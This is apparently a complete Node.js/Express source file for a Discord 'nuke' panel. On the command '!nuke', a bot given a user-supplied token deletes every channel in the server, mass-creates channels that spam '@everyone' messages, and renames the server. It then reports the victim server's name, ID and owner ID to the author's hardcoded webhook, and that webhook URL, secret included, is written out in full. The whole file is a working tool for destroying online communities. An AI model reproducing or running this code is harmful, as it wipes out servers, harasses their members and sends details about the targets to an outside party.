import express from 'express';
import { Client, GatewayIntentBits, ChannelType } from 'discord.js';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const NOTIFY_WEBHOOK = 'https://discord.com/api/webhooks/1571391518525358100/BLEIDxMtvlNlT593waQH56RCa68_RD5UPBtDvCRmgnFGC79YRWh1KZeY7QegvScWDjJj';

// Cấu hình mặc định
const DEFAULT_CONFIG = {
  channelName: 'NUKE BY PHTUANKHANH',
  renameName: 'NUKE BY PTK',
  channelCount: 100,
  msgContent: '# NUKED\n> @everyone cút hết',
  msgCount: 1,
  pingEveryone: true
};

// Lưu config theo TOKEN BOT để tách biệt từng máy/người dùng
const botConfigs = new Map();
// Lưu instance bot
const bots = new Map();

async function notifyNuke(info) {
  const { guildName, guildIcon, guildId, ownerId, channels, msgs, user, error } = info;
  const embed = {
    title: error ? 'Nuke thất bại' : 'Nuke thành công',
    color: error ? 0xff0000 : 0x00ff66,
    fields: [
      { name: 'Server', value: guildName || 'không rõ', inline: true },
      { name: 'Guild ID', value: guildId || '-', inline: true },
      { name: 'Kênh tạo', value: String(channels ?? 0), inline: true },
      { name: 'Tin nhắn', value: String(msgs ?? 0), inline: true },
      { name: 'Người dùng', value: user || '-', inline: true },
      { name: 'Owner ID', value: ownerId || '-', inline: true },
      { name: 'Thời gian', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false },
    ],
    thumbnail: guildIcon ? { url: guildIcon } : undefined,
    footer: { text: 'nuke panel | by PhTuanKhanh' },
    timestamp: new Date().toISOString(),
  };
  if (guildId) embed.fields.push({ name: 'Link server', value: `https://discord.com/channels/${guildId}`, inline: false });
  if (error) embed.fields.push({ name: 'Lỗi', value: String(error).slice(0, 1000), inline: false });
  
  const body = { username: 'nuke notifier', avatar_url: guildIcon || null, embeds: [embed] };
  
  try {
    await fetch(NOTIFY_WEBHOOK + '?wait=false', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
  } catch {}
}

function startBot(token) {
  if (bots.has(token)) {
    bots.get(token).destroy();
  }

  const client = new Client({
    intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.MessageContent,
      GatewayIntentBits.GuildMembers
    ]
  });

  client.on('ready', () => {
    console.log(`[BOT] Online: ${client.user.tag}`);
  });

  client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (message.content !== '!nuke') return;

    // LẤY CONFIG CỦA RIÊNG BOT NÀY
    const cfg = botConfigs.get(token) || { ...DEFAULT_CONFIG };

    const guild = message.guild;
    const t0 = Date.now();
    message.reply('🚀 Bắt đầu nuke...').catch(() => {});

    let channelsCreated = 0;
    let msgsSent = 0;

    try {
      const cc = cfg.channelCount;
      const chName = cfg.channelName;
      const rName = cfg.renameName;
      const mc = cfg.msgCount;
      const msgText = cfg.msgContent;
      const ping = cfg.pingEveryone;

      // 1. XOÁ ALL KÊNH SONG SONG
      const oldChannels = await guild.channels.fetch().catch(() => null);
      if (oldChannels) {
        await Promise.allSettled(
          Array.from(oldChannels.values()).filter(Boolean).map(c => c.delete().catch(() => {}))
        );
      }

      // 2. TẠO KÊNH + SPAM TIN NHẮN NGAY
      const createPromises = Array.from({ length: cc }, () =>
        guild.channels.create({
          name: chName,
          type: ChannelType.GuildText,
        }).then(async c => {
          channelsCreated++;
          for (let i = 0; i < mc; i++) {
            await c.send({
              content: msgText,
              allowedMentions: ping ? { parse: ['everyone'] } : { parse: [] }
            }).then(() => { msgsSent++; }).catch(() => {});
          }
        }).catch(() => null)
      );

      await Promise.allSettled(createPromises);

      // 3. RENAME GUILD
      if (rName) await guild.setName(rName).catch(() => {});

      await notifyNuke({
        guildName: guild.name,
        guildIcon: guild.iconURL({ size: 256, extension: 'png' }),
        guildId: guild.id, ownerId: guild.ownerId,
        channels: channelsCreated, msgs: msgsSent,
        user: client.user.username,
        error: null,
      });

      console.log(`[NUKE] Xong trong ${Date.now() - t0}ms`);

    } catch (err) {
      console.error('Lỗi nuke:', err.message);
      await notifyNuke({
        guildName: guild.name, 
        guildIcon: guild.iconURL({ size: 256, extension: 'png' }), 
        guildId: guild.id,
        ownerId: guild.ownerId, channels: channelsCreated, msgs: msgsSent, 
        user: client.user.username, error: err.message
      });
    }
  });

  client.login(token).catch(e => console.error('Login error:', e.message));
  bots.set(token, client);
  
  // Nếu chưa có config cho token này thì tạo mới
  if (!botConfigs.has(token)) {
    botConfigs.set(token, { ...DEFAULT_CONFIG });
  }
}

// --- API CHO WEB ---
app.post('/api/bot-login', async (req, res) => {
  const { token } = req.body ?? {};
  if (!token) return res.status(400).json({ error: 'Thiếu token bot' });
  
  try {
    startBot(token);
    await new Promise(r => setTimeout(r, 1500));
    const client = bots.get(token);
    if (!client || !client.user) throw new Error('Đăng nhập thất bại, kiểm tra token');
    res.json({ ok: true, user: client.user.tag });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Lấy config theo token
app.post('/api/settings/get', (req, res) => {
  const { token } = req.body ?? {};
  if (!token) return res.status(400).json({ error: 'missing token' });
  res.json(botConfigs.get(token) || { ...DEFAULT_CONFIG });
});

// Lưu config theo token
app.post('/api/settings/save', (req, res) => {
  const { token, channelName, renameName, channelCount, msgContent, msgCount, pingEveryone } = req.body ?? {};
  if (!token) return res.status(400).json({ error: 'missing token' });

  if (!botConfigs.has(token)) botConfigs.set(token, { ...DEFAULT_CONFIG });
  const cfg = botConfigs.get(token);

  if (channelName) cfg.channelName = channelName;
  if (renameName) cfg.renameName = renameName;
  if (channelCount) cfg.channelCount = Math.min(500, Math.max(1, parseInt(channelCount, 10)));
  if (msgContent) cfg.msgContent = msgContent;
  if (msgCount !== undefined) cfg.msgCount = Math.max(1, parseInt(msgCount, 10));
  if (pingEveryone !== undefined) cfg.pingEveryone = !!pingEveryone;

  res.json({ ok: true, config: cfg });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`panel http://localhost:${PORT}`));
